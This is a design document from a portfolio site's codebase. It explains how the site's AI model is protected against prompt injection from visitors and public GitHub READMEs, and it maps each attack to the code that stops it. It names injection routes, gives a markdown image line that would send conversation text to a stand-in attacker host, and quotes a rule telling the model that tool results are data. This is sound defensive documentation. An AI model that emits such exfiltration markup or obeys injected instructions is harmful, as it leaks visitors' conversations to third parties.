# Prompt-injection exposure

First appears in: **M11.1** (protection and failure paths). Status: **in use**. How a real model behaves with
injected text is measured in [the evaluation](../evaluation/README.md) (M11.3).

## 1. What it is

Prompt injection is text a model reads as instructions although it came from someone without that authority,
such as a visitor or a README. Models cannot reliably tell the two apart, so no prompt rule prevents it.
The useful question is what an injected instruction could achieve.

## 2. Why it matters in Promptfolio

The assistant reads text from visitors and from public GitHub repositories, which anyone could influence through
a contribution or a repository the owner includes. Visitors also trust the answers they see.

## 3. How it works

The design limits what the model can do, instead of trusting it to refuse:

| What an injection might try | What stops it | Enforced by |
| --------------------------- | ------------- | ------------ |
| Call a dangerous tool | Only two read-only lookup tools exist, and the model has no route to email | Code |
| Add a tool or change the rules through the request | The request allowlist drops `system` and `tools`, and refuses tool parts | Code |
| Run up cost | Tool, step, and output limits per turn, and daily limits on live answers | Code |
| Send conversation text away in an image URL | Images show as links, and `img-src` blocks other sites | Code and browser |
| Hide instructions in a README | Normalization removes comments, HTML tags, and images | Code |
| Gain the system prompt's authority | Source text only ever arrives as a tool result | Code |
| Make the model say something false | The prompt says tool results are data. **This is guidance only** | Prompt, not a guarantee |

**The image path deserves its own explanation.** A browser fetches an image without being asked. If injected text
convinces the model to write `![x](https://attacker.example/a.png?q=<conversation>)`, the attacker's server receives
that text the moment the answer renders, with no click. So
[`MarkdownImage`](../../apps/portfolio/src/components/assistant-ui/elements/markdown-image.tsx) renders every image
as a link, and the `img-src` policy in [`next.config.ts`](../../apps/portfolio/next.config.ts) is a second layer, in
case some other path renders an `<img>`.

In M11.3, injected text and links appeared in none of 12 runs on the model tested, and a forged earlier answer was not
repeated as fact in 3 runs. That is evidence about one model and these attempts. The table above is what still holds if a
model does follow an injection.

## 4. Where it lives in the code

- Request allowlist: [packages/ai/src/chat/request.ts](../../packages/ai/src/chat/request.ts)
- Tool set and budget: [packages/ai/src/grounding/profile-tools.ts](../../packages/ai/src/grounding/profile-tools.ts)
- Stream allowlist: `forVisitor` in [packages/ai/src/chat/chat-turn.ts](../../packages/ai/src/chat/chat-turn.ts)
- README cleaning: `readmeExcerpt` in [packages/source-github/src/snapshot/normalize.ts](../../packages/source-github/src/snapshot/normalize.ts)
- The whole path, from a hostile README to the prompt and the browser:
  [apps/portfolio/src/server/profile/injected-source.test.ts](../../apps/portfolio/src/server/profile/injected-source.test.ts)

## 5. Common pitfalls and misconceptions

- "The prompt tells the model to ignore instructions in data, so it is safe." A prompt lowers the odds and enforces
  nothing.
- "Removing HTML and images from a README is enough." The injected text can ask the model to write them itself,
  which is why rendering is protected too.
- A link needs a click, but it can still carry conversation text or point somewhere harmful. Since M12.7 only exact URLs
  from the profile become links ([links in answers](links-in-answers.md)). A repository's own homepage is on that list, and
  can point anywhere its owner likes.
- A test with a mock model shows what reaches the model, not what a real model does with it.
- "The visitor can forge earlier answers." Until M18 they could; since then the server keeps the history and the request
  holds only the new question. A visitor can still state a "fact" in that question, so the prompt tells the model that the
  text of earlier messages is not evidence, only tool results are.

## 6. Further reading

- [OWASP: LLM01 Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
- [MDN: Content-Security-Policy `img-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/img-src)
